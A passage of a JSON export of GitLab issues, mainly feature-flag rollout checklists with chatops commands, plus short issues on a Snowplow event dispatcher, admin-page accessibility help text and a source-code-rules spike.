Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\nWhen there are multiple stop actions for an environments, those stop actions are run in parallel as described in https://docs.gitlab.com/ee/ci/environments/#multiple-stop-actions-for-an-environment\n\n### When is the feature viable?\n\nWhen an environment is stopped, this feature is applicable.\n\n\u003c!-- \nExample below:\n \n1. Enable service ping collection\n   `ApplicationSetting.first.update(usage_ping_enabled: true)`\n--\u003e\n\n### What might happen if this goes wrong?\nEnvironment `on_stop` action can give 5xx.\n\n\n### What can we monitor to detect problems with this?\n  - https://log.gprd.gitlab.net/goto/3bd6bfb0-cbc8-11ec-afaf-2bca15dfbf33\n\n### What can we check for monitoring production after rollouts?\n\n\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status 62d832bbbe573e278316c7a0e52da2865118987e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set environment_multiple_stop_actions true --dev`\n    - [x] `/chatops run feature set environment_multiple_stop_actions true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status 651aeff6bcc301be32f7cb1eb532cbab7189e3b1`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab environment_multiple_stop_actions true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss environment_multiple_stop_actions true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com environment_multiple_stop_actions true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org environment_multiple_stop_actions true`\n    - [ ] `/chatops run feature set --group=gitlab-com environment_multiple_stop_actions true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e environment_multiple_stop_actions true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set environment_multiple_stop_actions \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set environment_multiple_stop_actions \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set environment_multiple_stop_actions true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `environment_multiple_stop_actions`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `environment_multiple_stop_actions` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [x] `/chatops run feature delete environment_multiple_stop_actions --dev`\n    - [x] `/chatops run feature delete environment_multiple_stop_actions --staging`\n    - [x] `/chatops run feature delete environment_multiple_stop_actions`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set environment_multiple_stop_actions false\n```","state":"closed","created_at":"2022-04-13T07:54:20.911Z","updated_at":"2022-05-16T18:18:15.942Z","closed_at":"2022-05-16T18:18:15.879Z","closed_by":{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"},"labels":["Category:Environment Management","devops::release","group::release","section::ops","type::feature","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"}],"author":{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"},"type":"ISSUE","assignee":{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358911","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":49,"completed_count":11},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"11 of 49 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358911","notes":"https://gitlab.com/api/v4/projects/278964/issues/358911/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358911/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358911","relative":"#358911","full":"gitlab-org/gitlab#358911"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106558833,"iid":358901,"project_id":278964,"title":"Always return boolean for Snowplow events FE dispatcher","description":"The following discussion from !84122 should be addressed:\n\n- @sheldonled started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84122#note_910430812): \n\n    \u003e **thought (non-blocking**): Maybe we want to wrap the `snowplow` call [here](https://gitlab.com/gitlab-org/gitlab/-/blob/8fe1ee4b89f64cbe1385c658ebc9358ce3443251/app/assets/javascripts/tracking/dispatch_snowplow_event.js#L27) so that we can always return boolean?\n    \u003e \n    \u003e ```\n    \u003e try {\n    \u003e   window.snowplow('trackStructEvent', category, action, label, property, value, contexts);\n    \u003e   return true;\n    \u003e } catch (error) {\n    \u003e   Sentry.captureException(error);\n    \u003e   return false;\n    \u003e }\n    \u003e ```\n\n## Testing\n\nUpdate related unit test and make sure QA pipelines are passing.","state":"closed","created_at":"2022-04-13T05:23:31.232Z","updated_at":"2022-05-13T14:03:41.676Z","closed_at":"2022-05-13T14:03:41.652Z","closed_by":{"id":5412956,"username":"agarciatesares","name":"Axel GarcÃ­a","state":"active","avatar_url":"https://secure.gravatar.com/avatar/11d24c6151c640aa435f8de30a01f5b8?s=80\u0026d=identicon","web_url":"https://gitlab.com/agarciatesares"},"labels":["devops::growth","frontend","group::product intelligence","maintenance::workflow","quad-planning::complete-action","section::growth","type::maintenance","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":5412956,"username":"agarciatesares","name":"Axel GarcÃ­a","state":"active","avatar_url":"https://secure.gravatar.com/avatar/11d24c6151c640aa435f8de30a01f5b8?s=80\u0026d=identicon","web_url":"https://gitlab.com/agarciatesares"}],"author":{"id":5412956,"username":"agarciatesares","name":"Axel GarcÃ­a","state":"active","avatar_url":"https://secure.gravatar.com/avatar/11d24c6151c640aa435f8de30a01f5b8?s=80\u0026d=identicon","web_url":"https://gitlab.com/agarciatesares"},"type":"ISSUE","assignee":{"id":5412956,"username":"agarciatesares","name":"Axel GarcÃ­a","state":"active","avatar_url":"https://secure.gravatar.com/avatar/11d24c6151c640aa435f8de30a01f5b8?s=80\u0026d=identicon","web_url":"https://gitlab.com/agarciatesares"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358901","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358901","notes":"https://gitlab.com/api/v4/projects/278964/issues/358901/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358901/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358901","relative":"#358901","full":"gitlab-org/gitlab#358901"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7759,"epic":{"id":476001,"iid":7759,"title":"Dispatch Snowplow events from their event definitions","url":"/groups/gitlab-org/-/epics/7759","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106538318,"iid":358831,"project_id":278964,"title":"[Feature flag] Rollout of `ci_expand_environment_name_and_url`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout #293674 / !84969 on production,\nthat is currently behind the `ci_expand_environment_name_and_url` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: ~\"group::pipeline authoring\" \n- Most appropriate slack channel to reach out to: `#g_pipeline-authoring`\n- Best individual to reach out to: @furkanayhan \n- PM: `@dhershkovitch`\n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\n\u003c!-- Describe the expected outcome when rolling out this feature --\u003e\n\n### When is the feature viable?\n\n\u003c!-- What are the settings we need to configure in order to have this feature viable? --\u003e\n\n\u003c!-- \nExample below:\n \n1. Enable service ping collection\n   `ApplicationSetting.first.update(usage_ping_enabled: true)`\n--\u003e\n\n### What might happen if this goes wrong?\n\n\u003c!-- Should the feature flag be turned off? Any MRs that need to be rolled back? Communication that needs to happen? What are some things you can think of that could go wrong - data loss or broken pages? --\u003e\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n_Consider mentioning checks for 5xx errors or other anomalies like an increase in redirects \n(302 HTTP response status)_\n\n### What can we check for monitoring production after rollouts?\n\n_Consider adding links to check for Sentry errors, Production logs for 5xx, 302s, etc._\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Enable the feature globally on non-production environments.\n    - [ ] `/chatops run feature set ci_expand_environment_name_and_url true --dev`\n    - [x] `/chatops run feature set ci_expand_environment_name_and_url true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab ci_expand_environment_name_and_url true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss ci_expand_environment_name_and_url true`\n    - [x] `/chatops run feature set --project=gitlab-com/www-gitlab-com ci_expand_environment_name_and_url true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org ci_expand_environment_name_and_url true`\n    - [ ] `/chatops run feature set --group=gitlab-com ci_expand_environment_name_and_url true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e ci_expand_environment_name_and_url true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com. \n- [ ] Ensure that any breaking changes have been announced following the [release post process](https://about.gitlab.com/handbook/marketing/blog/release-posts/#deprecations-removals-and-breaking-changes) to ensure GitLab customers are aware.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [x] `/chatops run feature set ci_expand_environment_name_and_url \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set ci_expand_environment_name_and_url \u003crollout-percentage\u003e --random`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set ci_expand_environment_name_and_url true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `ci_expand_environment_name_and_url`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `ci_expand_environment_name_and_url` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete ci_expand_environment_name_and_url --dev`\n    - [ ] `/chatops run feature delete ci_expand_environment_name_and_url --staging`\n    - [ ] `/chatops run feature delete ci_expand_environment_name_and_url`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set ci_expand_environment_name_and_url false\n```","state":"closed","created_at":"2022-04-12T16:00:06.193Z","updated_at":"2022-08-15T13:42:45.405Z","closed_at":"2022-07-26T08:23:05.471Z","closed_by":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"labels":["Category:Pipeline Authoring","backend","devops::verify","feature flag","group::pipeline authoring","section::ops","type::maintenance","workflow::production"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"}],"author":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"type":"ISSUE","assignee":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358831","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":50,"completed_count":7},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"7 of 50 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358831","notes":"https://gitlab.com/api/v4/projects/278964/issues/358831/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358831/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358831","relative":"#358831","full":"gitlab-org/gitlab#358831"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":{"id":61387,"iid":75,"sequence":22,"group_id":9970,"title":null,"description":null,"state":3,"created_at":"2022-05-29T00:05:02.030Z","updated_at":"2022-08-22T00:05:02.161Z","start_date":"2022-08-08","due_date":"2022-08-21","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/61387"},"health_status":"on_track"},{"id":106534736,"iid":358823,"project_id":278964,"title":"Improve accessibility of Admin app settings page - add help text","description":"In https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84651 we removed the placeholder property from the textarea in `app/views/admin/application_settings/_users_api_limits.html.haml` and similar, to improve the accessibility of the Admin application settings page.\n\nHowever, as @danmh [commmented](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84651#note_906102891):\n\u003e Although problematic, the placeholder did offer some clues of the expected input format. That information is now lost and we should bring in a more accessible way. How about using the help text below the text area?\n\nWe could add help text below the text area.","state":"closed","created_at":"2022-04-12T15:09:24.806Z","updated_at":"2022-05-24T12:01:16.485Z","closed_at":"2022-05-06T09:13:25.443Z","closed_by":{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"},"labels":["Deliverable","devops::manage","frontend","group::optimize","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"}],"author":{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"},"type":"ISSUE","assignee":{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358823","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358823","notes":"https://gitlab.com/api/v4/projects/278964/issues/358823/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358823/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358823","relative":"#358823","full":"gitlab-org/gitlab#358823"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106534324,"iid":358821,"project_id":278964,"title":"Investigate MVC Source code rules","description":"The goal of this spike is to analyse this proposed [MVC](https://gitlab.com/gitlab-org/gitlab/-/issues/351468) and understand how it would be implemented. In particular, understand how frontend and backend would be affected and if it can and should be broken down further.","state":"closed","created_at":"2022-04-12T15:02:02.042Z","updated_at":"2022-05-24T12:00:05.711Z","closed_at":"2022-05-16T15:01:12.198Z","closed_by":{"id":853414,"username":"andr3","name":"AndrÃ© LuÃ­s","state":"active","avatar_url":"https://secure.gravatar.com/avatar/241e39726efb512a29621070ccf26a90?s=80\u0026d=identicon","web_url":"https://gitlab.com/andr3"},"labels":["Category:Source Code Management","Deliverable","Stretch","UX","backend","backend-weight::2","devops::create","frontend","frontend-weight::1","group::source code","section::dev","spike","type::feature","workflow::in dev"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},{"id":10822493,"username":"tlinz","name":"Torsten Linz","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10822493/avatar.png","web_url":"https://gitlab.com/tlinz"}],"author":{"id":10822493,"username":"tlinz","name":"Torsten Linz","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10822493/avatar.png","web_url":"https://gitlab.com/tlinz"},"type":"ISSUE","assignee":{"id":2819375,"username":"jerasmus","name":"Jacques 